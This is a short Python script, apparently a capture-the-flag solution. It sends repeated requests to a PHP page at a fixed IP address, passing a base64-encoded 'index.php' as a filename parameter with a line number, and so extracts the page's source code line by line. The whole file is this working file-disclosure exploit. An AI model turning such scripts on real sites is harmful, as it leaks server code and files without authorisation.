import requests

a = 30
for i in range(a):
    url = "http://123.206.87.240:8002/web11/index.php?line=" + str(i) + "&filename=aW5kZXgucGhw"
    s = requests.get(url)
    print(s.text)

